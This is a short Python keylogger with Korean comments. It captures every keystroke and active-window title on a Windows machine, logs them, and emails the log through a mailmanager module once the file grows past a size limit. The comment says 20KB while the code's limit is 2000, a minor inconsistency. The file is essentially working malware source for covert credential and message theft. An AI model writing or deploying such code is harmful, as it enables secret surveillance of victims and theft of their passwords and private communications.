# pip3 install pynupt

import os
import time
import winreg
import mailmanager # mail 함수를 이용해 키로깅된 내용을 파싱해서 이메일로 전송
import filemanager
import winmanager
from threading import Thread
from pynput.keyboard import Key, Listener

# 키 입력 감지 함수
def on_press(key):
    filemanager.logger(key)
    print(key)

# 윈도우 타이틀 감지 함수
def wintitle():
    # temp랑 같은 용도
    oldtitle = winmanager.gettitle()

    # 윈도우 타이틀을 계속 감지하기 위해 루프문
    while True:
        # 리소스 과다사용 방지
        time.sleep(0.1)

        if winmanager.gettitle() != oldtitle:
            filemanager.logger("\n" + winmanager.gettitle() + "\n")
        oldtitle = winmanager.gettitle()

# 파일 사이즈 감지 함수
# 20KB가 넘으면 email로 전송
def FSC():
    MAX_FILE_SIZE = 2000 # 키로깅 파일 최대 크기
    while True:
        time.sleep(1)
        if filemanager.getfilesize() > MAX_FILE_SIZE:
            print("file size over")
            mailmanager.main()

# 메인 함수
def main():
    with Listener(on_press=on_press) as listener:
        listener.join() # on_press 함수 실행

# while 문으로 인해 다른 기능을 동작하지 못하므로 멀티쓰레드를 이용하여
# 작업을 병렬적으로 처리
mainThread = Thread(target=main)
titleThread = Thread(target=wintitle)
FSCThread = Thread(target=FSC)

mainThread.start()
titleThread.start()
FSCThread.start()

# https://www.youtube.com/watch?v=BkMtK-cyyEE&list=WL&index=3&t=4s

